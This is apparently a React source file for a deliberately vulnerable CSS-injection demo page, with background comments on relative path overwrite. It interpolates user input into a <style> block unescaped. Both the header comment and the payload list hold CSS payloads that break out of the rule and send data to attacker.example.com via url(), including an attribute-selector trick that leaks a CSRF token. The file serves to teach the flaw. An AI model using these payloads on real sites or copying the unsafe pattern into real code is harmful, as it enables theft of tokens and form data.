/**
 * Vulnerability: CSS Injection (+ RPO context)
 * Source: URLSearchParams('theme') (or form input)
 * Sink: raw interpolation into a <style> block
 * CWE-79 (XSS family, CSS variant), PortSwigger "CSS Injection"
 * SAST Rules: Semgrep tainted-style-block, ESLint security/detect-unsafe-regex (general)
 *
 * Background — RPO (Relative Path Overwrite):
 *   When a page references a stylesheet via a relative path (href="style.css"),
 *   the browser resolves it against the current URL. If routing lets an attacker
 *   alter the URL's apparent directory (e.g. PATH_INFO tricks, trailing slashes,
 *   reverse proxies that strip prefixes), the same HTML page itself can be
 *   loaded as the stylesheet. Anything attacker-controlled in the HTML then
 *   becomes a CSS rule. The actual leak then uses CSS injection primitives.
 *
 * Payloads (use the buttons below):
 *   red                                                  — benign value
 *   red; } body { background: pink !important; } a {     — escape the rule
 *   red; } * { background-image: url(//attacker.example.com/log?c=secret); } b {
 *
 * Real-world impact:
 *   - Defacement (override site styles, hide elements, fake content)
 *   - Data exfiltration via attribute selectors + url():
 *       input[value^="a"] { background: url(//attacker/?c=a); }
 *     leaks CSRF tokens / form values one character at a time.
 */
"use client";

import { useState } from "react";

const payloads = [
  { p: "red", note: "benign — sets the color" },
  {
    p: "red; } body { background: pink !important; } a {",
    note: "break out and override the whole page",
  },
  {
    p: "red; } * { background-image: url(//attacker.example.com/log?c=secret); } b {",
    note: "exfiltrate via background-image request",
  },
  {
    p: 'red; } input[name="csrf"][value^="a"] { background: url(//attacker.example.com/?c=a); } b {',
    note: "CSRF token leak (attribute selector trick)",
  },
];

export default function CssInjectionPage() {
  const [theme, setTheme] = useState("red");

  return (
    <div style={{ padding: 24, fontFamily: "system-ui, sans-serif" }}>
      {/* VULNERABLE: user input concatenated straight into a <style> block.
          A safe version would validate against a CSS color whitelist. */}
      <style
        dangerouslySetInnerHTML={{
          __html: `.user-theme { color: ${theme}; }`,
        }}
      />

      <h1 className="user-theme">CSS Injection Demo</h1>
      <p>
        The heading color comes from a <code>&lt;style&gt;</code> block whose
        value is interpolated from the form below — no escaping. Inject{" "}
        <code>{"}"}</code> to break out of the rule and add your own CSS.
      </p>

      <form
        onSubmit={(e) => e.preventDefault()}
        style={{ margin: "16px 0", display: "flex", gap: 8, flexWrap: "wrap" }}
      >
        <input
          type="text"
          value={theme}
          onChange={(e) => setTheme(e.target.value)}
          placeholder="color value"
          style={{ padding: 6, width: 480, border: "1px solid #888" }}
        />
      </form>

      <h3>Payloads to try (click to fill)</h3>
      <ul style={{ listStyle: "none", padding: 0 }}>
        {payloads.map(({ p, note }) => (
          <li key={p} style={{ margin: "4px 0" }}>
            <button
              type="button"
              onClick={() => setTheme(p)}
              style={{
                fontFamily: "monospace",
                padding: "4px 8px",
                border: "1px solid #888",
                background: "transparent",
                color: "inherit",
                cursor: "pointer",
                marginRight: 8,
                textAlign: "left",
                maxWidth: 600,
                whiteSpace: "normal",
                wordBreak: "break-all",
              }}
            >
              {p}
            </button>
            <span style={{ color: "#888" }}>— {note}</span>
          </li>
        ))}
      </ul>

      <h3>Generated CSS</h3>
      <pre style={{ background: "#111", color: "#0f0", padding: 12 }}>
        {`.user-theme { color: ${theme}; }`}
      </pre>

      <h3>Sample form (target for exfiltration payload)</h3>
      <p style={{ fontSize: 12, color: "#888" }}>
        Pretend this is a sensitive form on the page. The CSRF input value
        below is what the attribute-selector payload tries to leak.
      </p>
      <form onSubmit={(e) => e.preventDefault()}>
        <input type="hidden" name="csrf" value="abc123secret" />
        <input
          type="text"
          name="username"
          defaultValue="victim"
          style={{ padding: 6, border: "1px solid #888" }}
        />
      </form>
    </div>
  );
}
